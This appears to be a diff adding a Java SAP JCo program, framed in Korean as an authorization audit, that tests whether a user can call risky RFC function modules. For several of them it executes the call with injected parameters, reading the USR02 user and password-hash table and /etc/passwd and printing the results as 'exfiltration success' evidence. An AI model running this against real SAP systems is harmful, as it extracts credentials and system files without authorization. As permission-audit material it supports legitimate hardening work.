@@ -1,0 +1,120 @@
+import com.sap.conn.jco.*;
+import java.util.Properties;
+import java.io.File;
+import java.io.FileOutputStream;
+
+public class SaprfcTotalAuditMaster {
+    public static void main(String[] args) {
+        String destName = "TOTAL_AUDIT_DEST";
+        Properties props = new Properties();
+
+        // 1. 접속 정보 설정
+        props.setProperty("jco.client.ashost", "SAP_IP");
+        props.setProperty("jco.client.sysnr",  "00");
+        props.setProperty("jco.client.client", "100");
+        props.setProperty("jco.client.user",   "USER_ID");
+        props.setProperty("jco.client.passwd", "PASSWORD");
+
+        try {
+            createDestinationFile(destName, props);
+            JCoDestination destination = JCoDestinationManager.getDestination(destName);
+            
+            System.out.println("======================================================");
+            System.out.println("   [SAP 권한 설정 적정성 및 실효성 전수 검증]");
+            System.out.println("======================================================");
+
+            // [진단 대상 리스트 확장]
+            // 1. 커스텀 함수 그룹 (업무용 - 실행 성공해야 함)
+            runAudit(destination, "Custom Business Functions", new String[]{
+                "ZFT_RFC_OUTGOING_PMT_INFO", 
+                "ZFT_RFC_CUST_MASTER_QUERY", 
+                "ZFT_RFC_VENDOR_BALANCE"
+            }, true);
+
+            // 2. DB/테이블 직접 접근 (매우 위험 - 차단 필수)
+            runAudit(destination, "Database Table Access", new String[]{
+                "RFC_READ_TABLE", "BBP_RFC_READ_TABLE", "DSY_READ_TABLE", "TH_DB_TABLE_INFO"
+            }, false);
+
+            // 3. 파일 시스템/OS 접근 (위험 - 차단 필수)
+            runAudit(destination, "OS & File System Access", new String[]{
+                "RZL_READ_FILE_LOCAL", "EPS_GET_DIRECTORY_LISTING", "SXPG_COMMAND_EXECUTE", "RFC_REMOTE_EXEC"
+            }, false);
+
+            // 4. 권한 및 세션 탈취 (위험 - 차단 필수)
+            runAudit(destination, "Auth & Session Intelligence", new String[]{
+                "TH_USER_LIST", "BAPI_USER_GET_DETAIL", "SUSR_RFC_USER_INTERFACE"
+            }, false);
+
+        } catch (Exception e) {
+            System.err.println("[!] 연결 에러: " + e.getMessage());
+        }
+    }
+
+    public static void runAudit(JCoDestination dest, String category, String[] rfcList, boolean isNormal) {
+        System.out.println("\n[" + category + " 점검]");
+        for (String rfc : rfcList) {
+            System.out.print("  ▶ " + rfc + " : ");
+            try {
+                JCoFunction function = dest.getRepository().getFunction(rfc);
+                if (function == null) {
+                    System.out.println("[안전] 서버에 존재하지 않음");
+                    continue;
+                }
+
+                // 페이로드 주입 (데이터 탈취 증명용)
+                setPayload(function, rfc);
+                
+                function.execute(dest);
+
+                // 실행 성공 시
+                System.out.println("[★★★탈취 성공★★★]");
+                printDataSnippet(function, rfc);
+
+            } catch (JCoException e) {
+                analyzeError(e, isNormal);
+            }
+        }
+    }
+
+    private static void setPayload(JCoFunction func, String rfcName) {
+        if (rfcName.contains("READ_TABLE")) {
+            func.getImportParameterList().setValue("QUERY_TABLE", "USR02"); // 사용자 테이블
+            func.getImportParameterList().setValue("ROWCOUNT", 3);
+        } else if (rfcName.equals("RZL_READ_FILE_LOCAL")) {
+            func.getImportParameterList().setValue("NAME", "/etc/passwd");
+        }
+    }
+
+    private static void printDataSnippet(JCoFunction func, String rfcName) {
+        try {
+            if (rfcName.contains("READ_TABLE")) {
+                JCoTable table = func.getTableParameterList().getTable("DATA");
+                if (table.getNumRows() > 0) {
+                    table.setRow(0);
+                    System.out.println("     ㄴ [증거 데이터]: " + table.getString("WA"));
+                }
+            } else if (rfcName.equals("TH_USER_LIST")) {
+                JCoTable table = func.getTableParameterList().getTable("USRLIST");
+                System.out.println("     ㄴ [증거 데이터]: 현재 접속자 " + table.getNumRows() + "명 확인됨");
+            }
+        } catch (Exception e) { /* 데이터 구조가 다를 경우 패스 */ }
+    }
+
+    private static void analyzeError(JCoException e, boolean isNormal) {
+        if (e.getGroup() == 104) {
+            System.out.println(isNormal ? "[업무 마비] 권한이 없어 실행 불가" : "[!] 실행 거부 (설계도 노출/과도 권한)");
+        } else if (e.getMessage().contains("required") || e.getMessage().contains("NOT_FOUND")) {
+            System.out.println("[★실행 가능★] 권한 열려 있음 (파라미터 보정 시 즉시 탈취)");
+        } else {
+            System.out.println("[기타 응답] " + e.getMessage());
+        }
+    }
+
+    static void createDestinationFile(String name, Properties props) throws Exception {
+        File destFile = new File(name + ".jcoDestination");
+        try (FileOutputStream fos = new FileOutputStream(destFile)) {
+            props.store(fos, "Audit");
+        }
+    }
+}
